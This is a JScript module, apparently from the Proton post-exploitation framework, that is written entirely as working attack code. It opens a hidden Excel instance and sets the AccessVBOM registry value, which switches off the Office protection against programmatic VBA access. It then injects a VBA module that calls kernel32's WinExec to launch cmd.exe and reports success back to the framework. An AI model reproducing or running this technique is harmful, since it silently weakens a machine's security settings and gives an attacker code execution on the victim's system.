//            ---------------------------------------------------
//                             Proton Framework              
//            ---------------------------------------------------
//                Copyright (C) <2019-2020>  <Entynetproject>
//
//        This program is free software: you can redistribute it and/or modify
//        it under the terms of the GNU General Public License as published by
//        the Free Software Foundation, either version 3 of the License, or
//        any later version.
//
//        This program is distributed in the hope that it will be useful,
//        but WITHOUT ANY WARRANTY; without even the implied warranty of
//        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
//        GNU General Public License for more details.
//
//        You should have received a copy of the GNU General Public License
//        along with this program.  If not, see <http://www.gnu.org/licenses/>.

try {
    var objExcel = new ActiveXObject("Excel.Application");
    objExcel.Visible = false;
    var Application_Version = objExcel.Version;//Auto-Detect Version
    var strRegPath = "HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\" + Application_Version + "\\Excel\\Security\\AccessVBOM";

    var WshShell = new ActiveXObject("WScript.Shell");
    WshShell.RegWrite(strRegPath, 1, "REG_DWORD");
    var objWorkbook = objExcel.Workbooks.Add();
    var xlmodule = objWorkbook.VBProject.VBComponents.Add(1);

    strCode = '#If Vba7 Then\n'
    strCode += 'Private Declare PtrSafe Function WinExec Lib "kernel32" (ByVal cmd As String, ByVal nCmdShow As Long) As LongPtr\n'
    strCode += '#Else\n'
    strCode += 'Private Declare PtrSafe Function WinExec Lib "kernel32" (ByVal cmd As String, ByVal nCmdShow As Long) As Long\n'
    strCode += '#EndIf\n'
    strCode += '\n'
    strCode += 'Sub ExecShell\n'
    strCode += '		Dim i As Long\n'
    strCode += '		i = WinExec("cmd.exe", 1)\n'
    strCode += 'End Sub\n'

    xlmodule.CodeModule.AddFromString(strCode);
    var wut = "ExecShell";
    objExcel.Run(wut);
    objExcel.DisplayAlerts = false;
    objWorkbook.Close(false);

    proton.work.report("Success");
} catch (e) {
    proton.work.error(e);
}

proton.exit();
